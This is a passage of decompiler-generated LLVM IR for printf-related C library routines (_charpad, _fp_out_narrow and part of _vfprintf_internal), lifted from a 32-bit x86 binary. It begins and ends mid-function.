  %v1_805098d = add i32 %v0_805098d, 16
  %v2_805098d = inttoptr i32 %v1_805098d to i32*
  %v3_805098d = load i32, i32* %v2_805098d, align 4
  store i32 %v3_805098d, i32* %eax.global-to-local, align 4
  %v2_8050990 = add i32 %v0_805098d, 8
  %v3_8050990 = inttoptr i32 %v2_8050990 to i32*
  %v4_8050990 = load i32, i32* %v3_8050990, align 4
  %v5_8050990 = sub i32 %v3_805098d, %v4_8050990
  store i32 %v5_8050990, i32* %eax.global-to-local, align 4
  store i32 %v2_8050993, i32* @edx, align 4
  store i32 %v0_805096c, i32* @ebx, align 4
  ret i32 %v5_8050990

; uselistorder directives
  uselistorder i32 %v0_805098d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805098d, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8050998 = load i32, i32* @edi, align 4
  %v0_8050999 = load i32, i32* @esi, align 4
  %v0_805099a = load i32, i32* @ebx, align 4
  %v0_805099b = load i32, i32* @eax, align 4
  store i32 %v0_805099b, i32* @edi, align 4
  %v0_80509a0 = load i32, i32* @ecx, align 4
  store i32 %v0_80509a0, i32* @esi, align 4
  store i32 %v0_80509a0, i32* @ebx, align 4
  %v0_80509a4 = load i32, i32* @edx, align 4
  store i32 %v0_80509a4, i32* %stack_var_-13, align 4
  %v1_80509ab2 = icmp eq i32 %v0_80509a0, 0
  br i1 %v1_80509ab2, label %dec_label_pc_80509c3, label %dec_label_pc_80509af.lr.ph

dec_label_pc_80509af.lr.ph:                       ; preds = %entry
  %v2_80509af = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_80509af

dec_label_pc_80509aa:                             ; preds = %dec_label_pc_80509af
  %v1_80509aa = add i32 %v0_80509aa, -1
  %v8_80509aa = icmp eq i32 %v1_80509aa, 0
  store i32 %v1_80509aa, i32* @ebx, align 4
  br i1 %v8_80509aa, label %dec_label_pc_80509c3.loopexit, label %dec_label_pc_80509aa.dec_label_pc_80509af_crit_edge

dec_label_pc_80509aa.dec_label_pc_80509af_crit_edge: ; preds = %dec_label_pc_80509aa
  %v0_80509b3.pre = load i32, i32* @edx, align 4
  %v0_80509b4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80509af

dec_label_pc_80509af:                             ; preds = %dec_label_pc_80509aa.dec_label_pc_80509af_crit_edge, %dec_label_pc_80509af.lr.ph
  %v0_80509b4 = phi i32 [ %v0_80509b4.pre, %dec_label_pc_80509aa.dec_label_pc_80509af_crit_edge ], [ %v0_805099b, %dec_label_pc_80509af.lr.ph ]
  %v0_80509b3 = phi i32 [ %v0_80509b3.pre, %dec_label_pc_80509aa.dec_label_pc_80509af_crit_edge ], [ %v0_80509a4, %dec_label_pc_80509af.lr.ph ]
  %v4_80509b8 = call i32 @__stdio_fwrite(i32 %v2_80509af, i32 1, i32 %v0_80509b4, i32 %v0_80509b3)
  %v8_80509c0 = icmp eq i32 %v4_80509b8, 1
  %v0_80509aa = load i32, i32* @ebx, align 4
  br i1 %v8_80509c0, label %dec_label_pc_80509aa, label %dec_label_pc_80509c3.loopexit

dec_label_pc_80509c3.loopexit:                    ; preds = %dec_label_pc_80509aa, %dec_label_pc_80509af
  %v1_80509c3.ph = phi i32 [ %v0_80509aa, %dec_label_pc_80509af ], [ 0, %dec_label_pc_80509aa ]
  %v0_80509c3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80509c3

dec_label_pc_80509c3:                             ; preds = %dec_label_pc_80509c3.loopexit, %entry
  %v0_80509c3 = phi i32 [ 0, %entry ], [ %v0_80509c3.pre, %dec_label_pc_80509c3.loopexit ]
  %v1_80509c3 = phi i32 [ 0, %entry ], [ %v1_80509c3.ph, %dec_label_pc_80509c3.loopexit ]
  %v2_80509c3 = sub i32 %v0_80509c3, %v1_80509c3
  store i32 %v0_805099a, i32* @ebx, align 4
  store i32 %v0_8050999, i32* @esi, align 4
  store i32 %v0_8050998, i32* @edi, align 4
  ret i32 %v2_80509c3

; uselistorder directives
  uselistorder i32 %v1_80509aa, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_80509c3.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_80509e1 = trunc i32 %arg2 to i8
  %v5_80509e1 = icmp slt i8 %v3_80509e1, 0
  %v1_80509e3 = icmp eq i1 %v5_80509e1, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_80509e3, label %dec_label_pc_8050a14, label %dec_label_pc_80509e5

dec_label_pc_80509e5:                             ; preds = %entry
  %v3_80509ec = call i32 @strlen(i8* %arg4)
  %v0_80509f4 = load i32, i32* @ebx, align 4
  %v2_80509f4 = sub i32 %v0_80509f4, %v3_80509ec
  store i32 %v2_80509f4, i32* @ebx, align 4
  store i32 %v3_80509ec, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_80509f4, 1
  br i1 %tmp23, label %dec_label_pc_8050a12, label %dec_label_pc_80509fc

dec_label_pc_80509fc:                             ; preds = %dec_label_pc_80509e5
  %v0_80509fc = load i32, i32* @edi, align 4
  %v1_80509fc = urem i32 %v0_80509fc, 128
  store i32 %v1_80509fc, i32* @edi, align 4
  store i32 %v2_80509f4, i32* @ecx, align 4
  store i32 %v1_80509fc, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8050a07 = call i32 @_charpad()
  store i32 %v0_8050a07, i32* @ebp, align 4
  %v12_8050a0e = icmp eq i32 %v0_8050a07, %v2_80509f4
  %v1_8050a10 = icmp eq i1 %v12_8050a0e, false
  br i1 %v1_8050a10, label %dec_label_pc_8050a2e, label %dec_label_pc_80509fc.dec_label_pc_8050a12_crit_edge

dec_label_pc_80509fc.dec_label_pc_8050a12_crit_edge: ; preds = %dec_label_pc_80509fc
  %v0_8050a12.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050a12

dec_label_pc_8050a12:                             ; preds = %dec_label_pc_80509fc.dec_label_pc_8050a12_crit_edge, %dec_label_pc_80509e5
  %v0_8050a12 = phi i32 [ %v0_8050a12.pre, %dec_label_pc_80509fc.dec_label_pc_8050a12_crit_edge ], [ %v3_80509ec, %dec_label_pc_80509e5 ]
  store i32 %v0_8050a12, i32* @ebx, align 4
  br label %dec_label_pc_8050a14

dec_label_pc_8050a14:                             ; preds = %entry, %dec_label_pc_8050a12
  %v0_8050a1f = phi i32 [ %arg3, %entry ], [ %v0_8050a12, %dec_label_pc_8050a12 ]
  %tmp24 = icmp slt i32 %v0_8050a1f, 1
  br i1 %tmp24, label %dec_label_pc_8050a2c, label %dec_label_pc_8050a1a

dec_label_pc_8050a1a:                             ; preds = %dec_label_pc_8050a14
  %v0_8050a1a = load i32, i32* @ecx, align 4
  %v5_8050a24 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8050a1f, i32 %arg1, i32 %v0_8050a1a)
  br label %dec_label_pc_8050a2c

dec_label_pc_8050a2c:                             ; preds = %dec_label_pc_8050a14, %dec_label_pc_8050a1a
  %v1_8050a2c = phi i32 [ 0, %dec_label_pc_8050a14 ], [ %v5_8050a24, %dec_label_pc_8050a1a ]
  %v0_8050a2c = load i32, i32* @ebp, align 4
  %v2_8050a2c = add i32 %v0_8050a2c, %v1_8050a2c
  br label %dec_label_pc_8050a2e

dec_label_pc_8050a2e:                             ; preds = %dec_label_pc_80509fc, %dec_label_pc_8050a2c
  %v0_8050a31 = phi i32 [ %v0_8050a07, %dec_label_pc_80509fc ], [ %v2_8050a2c, %dec_label_pc_8050a2c ]
  ret i32 %v0_8050a31

; uselistorder directives
  uselistorder i32 %v0_8050a1f, { 1, 0 }
  uselistorder i32 %v0_8050a07, { 1, 0, 2 }
  uselistorder i32 %v1_80509fc, { 1, 0 }
  uselistorder i32 %v2_80509f4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050a2e, { 1, 0 }
  uselistorder label %dec_label_pc_8050a2c, { 1, 0 }
  uselistorder label %dec_label_pc_8050a14, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_8050a42 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050a42, i32* @ebx, align 4
  %v2_8050a4a = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8050a4a, i32* @esi, align 4
  %v5_8050a4f = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8050a42)
  store i32 %v5_8050a4f, i32* %eax.global-to-local, align 4
  %v2_8050a57 = icmp slt i32 %v5_8050a4f, 0
  %v1_8050a59 = icmp eq i1 %v2_8050a57, false
  br i1 %v1_8050a59, label %dec_label_pc_8050a99, label %dec_label_pc_8050a5b

dec_label_pc_8050a5b:                             ; preds = %entry
  %v3_8050a5b = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8050a5b, i32* @ebx, align 4
  %v5_8050a62 = inttoptr i32 %v3_8050a5b to i8*
  %v3_8050a63 = call i32 @strlen(i8* %v5_8050a62)
  store i32 %v3_8050a63, i32* %eax.global-to-local, align 4
  %v1_8050a6b = icmp eq i32 %v3_8050a63, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_8050a6b, label %dec_label_pc_8050fd2, label %dec_label_pc_8050a7a

dec_label_pc_8050a7a:                             ; preds = %dec_label_pc_8050a5b
  %v0_8050a7a = load i32, i32* @edx, align 4
  %v0_8050a83 = load i32, i32* @ebx, align 4
  %v6_8050a84 = call i32 @__stdio_fwrite(i32 %v0_8050a83, i32 %v3_8050a63, i32 %arg1, i32 %v0_8050a7a)
  store i32 %v6_8050a84, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_8050fd2

dec_label_pc_8050a99:                             ; preds = %entry
  %v6_8050aa3 = call i32 @_ppfs_prepargs(i32 %v2_8050a4a, i32 %arg3, i32 %v5_8050a4f, i32 %v5_8050a4f)
  store i32 %v6_8050aa3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8050ab0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ab0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050ab8

dec_label_pc_8050ab7:                             ; preds = %dec_label_pc_8050abe
  %v1_8050ab7 = add i32 %v0_8050ac6, 1
  store i32 %v1_8050ab7, i32* @ebx, align 4
  br label %dec_label_pc_8050ab8.backedge

dec_label_pc_8050ab8.backedge:                    ; preds = %dec_label_pc_8050ab7, %dec_label_pc_8050fb8, %dec_label_pc_8050fc3
  %v1_8050ac219 = phi i32 [ %v1_8050aca, %dec_label_pc_8050ab7 ], [ %v3_8050fb8, %dec_label_pc_8050fb8 ], [ %v1_8050af6, %dec_label_pc_8050fc3 ]
  %v0_8050ab817 = phi i32 [ %v1_8050ab7, %dec_label_pc_8050ab7 ], [ %v3_8050fb8, %dec_label_pc_8050fb8 ], [ %v1_8050fc3, %dec_label_pc_8050fc3 ]
  %v4_8050ab8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ab8

dec_label_pc_8050ab8:                             ; preds = %dec_label_pc_8050ab8.backedge, %dec_label_pc_8050a99
  %v1_8050aca = phi i32 [ %v1_8050ac219, %dec_label_pc_8050ab8.backedge ], [ %v0_8050ab0, %dec_label_pc_8050a99 ]
  %v0_8050ac6 = phi i32 [ %v0_8050ab817, %dec_label_pc_8050ab8.backedge ], [ %v0_8050ab0, %dec_label_pc_8050a99 ]
  %v4_8050ab8 = phi i32 [ %v4_8050ab8.pre, %dec_label_pc_8050ab8.backedge ], [ %v6_8050aa3, %dec_label_pc_8050a99 ]
  %v1_8050ab8 = inttoptr i32 %v0_8050ac6 to i8*
  %v2_8050ab8 = load i8, i8* %v1_8050ab8, align 1
  %v3_8050ab8 = zext i8 %v2_8050ab8 to i32
  %v5_8050ab8 = and i32 %v4_8050ab8, -256
  %v6_8050ab8 = or i32 %v3_8050ab8, %v5_8050ab8
  store i32 %v6_8050ab8, i32* %eax.global-to-local, align 4
  %v4_8050aba = icmp eq i8 %v2_8050ab8, 0
  br i1 %v4_8050aba, label %dec_label_pc_8050ac2, label %dec_label_pc_8050abe

dec_label_pc_8050abe:                             ; preds = %dec_label_pc_8050ab8
  %v10_8050abe = icmp eq i8 %v2_8050ab8, 37
  %v1_8050ac0 = icmp eq i1 %v10_8050abe, false
  br i1 %v1_8050ac0, label %dec_label_pc_8050ab7, label %dec_label_pc_8050ac2

dec_label_pc_8050ac2:                             ; preds = %dec_label_pc_8050abe, %dec_label_pc_8050ab8
  %v2_8050ac2 = sub i32 %v0_8050ac6, %v1_8050aca
  %v12_8050ac2 = icmp eq i32 %v2_8050ac2, 0
  br i1 %v12_8050ac2, label %dec_label_pc_8050aed, label %dec_label_pc_8050ac6

dec_label_pc_8050ac6:                             ; preds = %dec_label_pc_8050ac2
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050ac2, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_8050ac2, 1
  br i1 %tmp66, label %dec_label_pc_8050ae2, label %dec_label_pc_8050ad0

dec_label_pc_8050ad0:                             ; preds = %dec_label_pc_8050ac6
  %v0_8050ad0 = load i32, i32* @ebp, align 4
  %v1_8050ad0 = load i32, i32* @esp, align 4
  %v2_8050ad0 = add i32 %v1_8050ad0, -4
  %v3_8050ad0 = inttoptr i32 %v2_8050ad0 to i32*
  store i32 %v0_8050ad0, i32* %v3_8050ad0, align 4
  %v1_8050ad1 = add i32 %v1_8050ad0, 368
  %v2_8050ad1 = inttoptr i32 %v1_8050ad1 to i32*
  %v3_8050ad1 = load i32, i32* %v2_8050ad1, align 4
  %v5_8050ad1 = add i32 %v1_8050ad0, -8
  %v6_8050ad1 = inttoptr i32 %v5_8050ad1 to i32*
  store i32 %v3_8050ad1, i32* %v6_8050ad1, align 4
  %v0_8050ad8 = load i32, i32* @esi, align 4
  %v2_8050ad8 = add i32 %v1_8050ad0, -12
  %v3_8050ad8 = inttoptr i32 %v2_8050ad8 to i32*
  store i32 %v0_8050ad8, i32* %v3_8050ad8, align 4
  %v0_8050ad9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050ad9 = add i32 %v1_8050ad0, -16
  %v3_8050ad9 = inttoptr i32 %v2_8050ad9 to i32*
  store i32 %v0_8050ad9, i32* %v3_8050ad9, align 4
  %v0_8050ada = load i32, i32* %stack_var_-364, align 4
  %v4_8050ada = call i32 @__stdio_fwrite(i32 %v0_8050ada, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050ada, i32* %eax.global-to-local, align 4
  %v1_8050ae2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050ae2

dec_label_pc_8050ae2:                             ; preds = %dec_label_pc_8050ac6, %dec_label_pc_8050ad0
  %v3_8050aea = phi i32 [ %v2_8050ac2, %dec_label_pc_8050ac6 ], [ %v1_8050ae2.pre, %dec_label_pc_8050ad0 ]
  %v0_8050ae2 = phi i32 [ 0, %dec_label_pc_8050ac6 ], [ %v4_8050ada, %dec_label_pc_8050ad0 ]
  %v12_8050ae2 = icmp eq i32 %v0_8050ae2, %v3_8050aea
  %v1_8050ae4 = icmp eq i1 %v12_8050ae2, false
  %v0_8050fcb.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8050ae4, label %dec_label_pc_8050fcb, label %dec_label_pc_8050aea

dec_label_pc_8050aea:                             ; preds = %dec_label_pc_8050ae2
  %v1_8050aea = inttoptr i32 %v0_8050fcb.pre.pre to i32*
  %v2_8050aea = load i32, i32* %v1_8050aea, align 4
  %v4_8050aea = add i32 %v2_8050aea, %v3_8050aea
  store i32 %v4_8050aea, i32* %v1_8050aea, align 4
  %v0_8050aed.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050aed

dec_label_pc_8050aed:                             ; preds = %dec_label_pc_8050ac2, %dec_label_pc_8050aea
  %v0_8050fc3 = phi i32 [ %v0_8050ac6, %dec_label_pc_8050ac2 ], [ %v0_8050aed.pre, %dec_label_pc_8050aea ]
  %v1_8050aed = inttoptr i32 %v0_8050fc3 to i8*
  %v2_8050aed = load i8, i8* %v1_8050aed, align 1
  %v3_8050aed = icmp eq i8 %v2_8050aed, 0
  br i1 %v3_8050aed, label %dec_label_pc_8050fd2, label %dec_label_pc_8050af6

dec_label_pc_8050af6:                             ; preds = %dec_label_pc_8050aed
  %v1_8050af6 = add i32 %v0_8050fc3, 1
  store i32 %v1_8050af6, i32* %edx.global-to-local, align 4
  %v2_8050af9 = inttoptr i32 %v1_8050af6 to i8*
  %v3_8050af9 = load i8, i8* %v2_8050af9, align 1
  %v12_8050af9 = icmp eq i8 %v3_8050af9, 37
  br i1 %v12_8050af9, label %dec_label_pc_8050fc3, label %dec_label_pc_8050b03

dec_label_pc_8050b03:                             ; preds = %dec_label_pc_8050af6
  %v1_8050b03 = load i32, i32* @esp, align 4
  %v2_8050b03 = add i32 %v1_8050b03, 16
  %v3_8050b03 = inttoptr i32 %v2_8050b03 to i32*
  store i32 %v1_8050af6, i32* %v3_8050b03, align 4
  %v0_8050b07 = load i32, i32* @esp, align 4
  %v1_8050b07 = add i32 %v0_8050b07, 340
  %v2_8050b07 = inttoptr i32 %v1_8050b07 to i32*
  store i32 0, i32* %v2_8050b07, align 4
  %v0_8050b12 = load i32, i32* @esp, align 4
  %v1_8050b15 = add i32 %v0_8050b12, 16
  store i32 %v1_8050b15, i32* @ebx, align 4
  %v2_8050b19 = add i32 %v0_8050b12, -16
  %v3_8050b19 = inttoptr i32 %v2_8050b19 to i32*
  store i32 %v1_8050b15, i32* %v3_8050b19, align 4
  %v0_8050b1a = load i32, i32* %stack_var_-364, align 4
  %v1_8050b1a = inttoptr i32 %v0_8050b1a to i32*
  %v2_8050b1a = call i32 @_ppfs_parsespec(i32* %v1_8050b1a)
  store i32 %v2_8050b1a, i32* %eax.global-to-local, align 4
  %v0_8050b1f = load i32, i32* @ebx, align 4
  %v1_8050b1f = load i32, i32* @esp, align 4
  %v2_8050b1f = inttoptr i32 %v1_8050b1f to i32*
  store i32 %v0_8050b1f, i32* %v2_8050b1f, align 4
  %v0_8050b22 = load i32, i32* %stack_var_-364, align 4
  %v1_8050b22 = call i32 @_ppfs_setargs(i32 %v0_8050b22)
  store i32 %v1_8050b22, i32* %eax.global-to-local, align 4
  %v0_8050b27 = load i32, i32* @esp, align 4
  %v1_8050b27 = add i32 %v0_8050b27, 70
  %v2_8050b27 = inttoptr i32 %v1_8050b27 to i8*
  %v3_8050b27 = load i8, i8* %v2_8050b27, align 1
  %v4_8050b27 = zext i8 %v3_8050b27 to i32
  store i32 %v4_8050b27, i32* @edi, align 4
  %v1_8050b2c = add i32 %v0_8050b27, 16
  %v1_8050b2f = add i32 %v0_8050b27, 56
  %v2_8050b2f = inttoptr i32 %v1_8050b2f to i32*
  %v3_8050b2f = load i32, i32* %v2_8050b2f, align 4
  %v1_8050b34 = add i32 %v0_8050b27, 112
  store i32 %v1_8050b34, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_8050b2f, 1
  br i1 %tmp67, label %dec_label_pc_8050b41, label %dec_label_pc_8050b3a

dec_label_pc_8050b3a:                             ; preds = %dec_label_pc_8050b03
  %v2_8050b3a = zext i8 %v3_8050b27 to i32
  %v3_8050b3a = mul nuw nsw i32 %v2_8050b3a, 12
  store i32 %v3_8050b3a, i32* %eax.global-to-local, align 4
  %v2_8050b3d = add i32 %v0_8050b27, 100
  %v3_8050b3d = add i32 %v2_8050b3d, %v3_8050b3a
  store i32 %v3_8050b3d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050b41

dec_label_pc_8050b41:                             ; preds = %dec_label_pc_8050b03, %dec_label_pc_8050b3a
  %v0_8050b4927 = phi i32 [ %v1_8050b34, %dec_label_pc_8050b03 ], [ %v3_8050b3d, %dec_label_pc_8050b3a ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050b43 = add i32 %v0_8050b27, 60
  %v2_8050b43 = inttoptr i32 %v1_8050b43 to i32*
  %v3_8050b43 = load i32, i32* %v2_8050b43, align 4
  store i32 %v3_8050b43, i32* %ecx.global-to-local, align 4
  %v2_8050b5472 = sub i32 0, %v3_8050b43
  %v10_8050b5475 = and i32 %v3_8050b43, %v2_8050b5472
  %v11_8050b5476 = icmp slt i32 %v10_8050b5475, 0
  %v13_8050b5477 = icmp slt i32 %v2_8050b5472, 0
  %v2_8050b5678 = icmp eq i1 %v13_8050b5477, %v11_8050b5476
  br i1 %v2_8050b5678, label %dec_label_pc_8050b58, label %dec_label_pc_8050b49

dec_label_pc_8050b49:                             ; preds = %dec_label_pc_8050b41, %dec_label_pc_8050b49
  %v0_8050b5882 = phi i32 [ %v0_8050b58, %dec_label_pc_8050b49 ], [ %v1_8050b2c, %dec_label_pc_8050b41 ]
  %v2_8050b4981 = phi i32 [ %v1_8050b53, %dec_label_pc_8050b49 ], [ 0, %dec_label_pc_8050b41 ]
  %v0_8050b4980 = phi i32 [ %v1_8050b50, %dec_label_pc_8050b49 ], [ %v0_8050b4927, %dec_label_pc_8050b41 ]
  %v3_8050b49 = mul i32 %v2_8050b4981, 4
  %v4_8050b49 = add i32 %v0_8050b5882, 344
  %v5_8050b49 = add i32 %v4_8050b49, %v3_8050b49
  %v6_8050b49 = inttoptr i32 %v5_8050b49 to i32*
  store i32 %v0_8050b4980, i32* %v6_8050b49, align 4
  %v0_8050b50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b50 = add i32 %v0_8050b50, 12
  store i32 %v1_8050b50, i32* %edx.global-to-local, align 4
  %v0_8050b53 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b53 = add i32 %v0_8050b53, 1
  store i32 %v1_8050b53, i32* %eax.global-to-local, align 4
  %v1_8050b54.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050b54 = sub i32 %v1_8050b53, %v1_8050b54.pre
  %v8_8050b54 = xor i32 %v1_8050b53, %v1_8050b54.pre
  %v9_8050b54 = xor i32 %v2_8050b54, %v1_8050b53
  %v10_8050b54 = and i32 %v9_8050b54, %v8_8050b54
  %v11_8050b54 = icmp slt i32 %v10_8050b54, 0
  %v13_8050b54 = icmp slt i32 %v2_8050b54, 0
  %v2_8050b56 = icmp eq i1 %v13_8050b54, %v11_8050b54
  %v0_8050b58 = load i32, i32* @esp, align 4
  br i1 %v2_8050b56, label %dec_label_pc_8050b58, label %dec_label_pc_8050b49

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b49, %dec_label_pc_8050b41
  %v0_8050b58.lcssa = phi i32 [ %v1_8050b2c, %dec_label_pc_8050b41 ], [ %v0_8050b58, %dec_label_pc_8050b49 ]
  %v1_8050b58 = add i32 %v0_8050b58.lcssa, 48
  %v2_8050b58 = inttoptr i32 %v1_8050b58 to i32*
  %v3_8050b58 = load i32, i32* %v2_8050b58, align 4
  store i32 %v3_8050b58, i32* @ecx, align 4
  %v1_8050b5c = icmp eq i32 %v3_8050b58, 0
  %v1_8050b5e = icmp eq i1 %v1_8050b5c, false
  br i1 %v1_8050b5e, label %dec_label_pc_8050b86, label %dec_label_pc_8050b60

dec_label_pc_8050b60:                             ; preds = %dec_label_pc_8050b58
  %v1_8050b60 = inttoptr i32 %v0_8050b58.lcssa to i32*
  %v2_8050b60 = load i32, i32* %v1_8050b60, align 4
  store i32 %v2_8050b60, i32* %eax.global-to-local, align 4
  %v1_8050b63 = ashr i32 %v2_8050b60, 31
  store i32 %v1_8050b63, i32* %edx.global-to-local, align 4
  %v2_8050b64 = add i32 %v0_8050b58.lcssa, -4
  %v3_8050b64 = inttoptr i32 %v2_8050b64 to i32*
  store i32 %v1_8050b63, i32* %v3_8050b64, align 4
  %v0_8050b65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b65 = add i32 %v0_8050b58.lcssa, -8
  %v3_8050b65 = inttoptr i32 %v2_8050b65 to i32*
  store i32 %v0_8050b65, i32* %v3_8050b65, align 4
  %v1_8050b66 = add i32 %v0_8050b58.lcssa, 32
  %v2_8050b66 = inttoptr i32 %v1_8050b66 to i32*
  %v3_8050b66 = load i32, i32* %v2_8050b66, align 4
  %v1_8050b6a = and i32 %v3_8050b66, 3840
  store i32 %v1_8050b6a, i32* %eax.global-to-local, align 4
  %v2_8050b6f = add i32 %v0_8050b58.lcssa, -12
  %v3_8050b6f = inttoptr i32 %v2_8050b6f to i32*
  store i32 %v1_8050b6a, i32* %v3_8050b6f, align 4
  %v1_8050b70 = add i32 %v0_8050b58.lcssa, 344
  %v2_8050b70 = inttoptr i32 %v1_8050b70 to i32*
  %v3_8050b70 = load i32, i32* %v2_8050b70, align 4
  store i32 %v3_8050b70, i32* %eax.global-to-local, align 4
  %v1_8050b77 = inttoptr i32 %v3_8050b70 to i32*
  %v2_8050b77 = load i32, i32* %v1_8050b77, align 4
  %v4_8050b77 = add i32 %v0_8050b58.lcssa, -16
  %v5_8050b77 = inttoptr i32 %v4_8050b77 to i32*
  store i32 %v2_8050b77, i32* %v5_8050b77, align 4
  %v0_8050b79 = call i32 @_store_inttype()
  store i32 %v0_8050b79, i32* %eax.global-to-local, align 4
  %v0_8050b7e = load i32, i32* @esp, align 4
  %v1_8050b7e = add i32 %v0_8050b7e, 16
  br label %dec_label_pc_8050fb8

dec_label_pc_8050b86:                             ; preds = %dec_label_pc_8050b58
  %tmp85 = icmp ult i32 %v3_8050b58, 8
  br i1 %tmp85, label %dec_label_pc_8050b8f, label %dec_label_pc_8050cf0

dec_label_pc_8050b8f:                             ; preds = %dec_label_pc_8050b86
  %v1_8050b8f = add i32 %v3_8050b58, 134591804
  %v2_8050b8f = inttoptr i32 %v1_8050b8f to i8*
  %v3_8050b8f = load i8, i8* %v2_8050b8f, align 1
  %v4_8050b8f = sext i8 %v3_8050b8f to i32
  store i32 %v4_8050b8f, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8050b9b = icmp eq i8 %v3_8050b8f, 10
  %v1_8050b9e = icmp eq i1 %v9_8050b9b, false
  br i1 %v1_8050b9e, label %dec_label_pc_8050bbc, label %dec_label_pc_8050ba0

dec_label_pc_8050ba0:                             ; preds = %dec_label_pc_8050b8f
  %v1_8050ba0 = add i32 %v0_8050b58.lcssa, 32
  %v2_8050ba0 = inttoptr i32 %v1_8050ba0 to i32*
  %v3_8050ba0 = load i32, i32* %v2_8050ba0, align 4
  %v1_8050ba6 = and i32 %v3_8050ba0, 32
  store i32 %v1_8050ba6, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_8050ba6, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_8050bb4 = trunc i32 %v3_8050ba0 to i8
  %v2_8050bb4 = and i8 %v1_8050bb4, 64
  %v3_8050bb4 = icmp eq i8 %v2_8050bb4, 0
  %v5_8050bb4 = zext i8 %v2_8050bb4 to i32
  %v7_8050bb4 = and i32 %v3_8050ba0, -256
  %v8_8050bb4 = or i32 %v5_8050bb4, %v7_8050bb4
  store i32 %v8_8050bb4, i32* %edx.global-to-local, align 4
  br i1 %v3_8050bb4, label %dec_label_pc_8050bbc, label %dec_label_pc_8050bb9

dec_label_pc_8050bb9:                             ; preds = %dec_label_pc_8050ba0
  %v2_8050bb9 = or i32 %tmp69, 128
  store i32 %v2_8050bb9, i32* @ebx, align 4
  br label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %dec_label_pc_8050ba0, %dec_label_pc_8050b8f, %dec_label_pc_8050bb9
  %tmp86 = icmp ult i32 %v3_8050b58, 6
  br i1 %tmp86, label %dec_label_pc_8050bc1, label %dec_label_pc_8050bd9

dec_label_pc_8050bc1:                             ; preds = %dec_label_pc_8050bbc
  %v9_8050bc1 = icmp eq i32 %v3_8050b58, 3
  %v1_8050bc4 = icmp eq i1 %v9_8050bc1, false
  br i1 %v1_8050bc4, label %dec_label_pc_8050bcd, label %dec_label_pc_8050bc6

dec_label_pc_8050bc6:                             ; preds = %dec_label_pc_8050bc1
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8050bdb

dec_label_pc_8050bcd:                             ; preds = %dec_label_pc_8050bc1
  %v9_8050bd2 = icmp eq i32 %v3_8050b58, 1
  br i1 %v9_8050bd2, label %dec_label_pc_8050be0, label %dec_label_pc_8050bdb

dec_label_pc_8050bd9:                             ; preds = %dec_label_pc_8050bbc
  %v1_8050bd9 = sub nsw i32 0, %v4_8050b8f
  store i32 %v1_8050bd9, i32* @esi, align 4
  br label %dec_label_pc_8050bdb

dec_label_pc_8050bdb:                             ; preds = %dec_label_pc_8050bcd, %dec_label_pc_8050bc6, %dec_label_pc_8050bd9
  br label %dec_label_pc_8050be0

dec_label_pc_8050be0:                             ; preds = %dec_label_pc_8050bcd, %dec_label_pc_8050bdb
  %storemerge96 = phi i32 [ 11, %dec_label_pc_8050bdb ], [ 6, %dec_label_pc_8050bcd ]
  store i32 %storemerge96, i32* @ebp, align 4
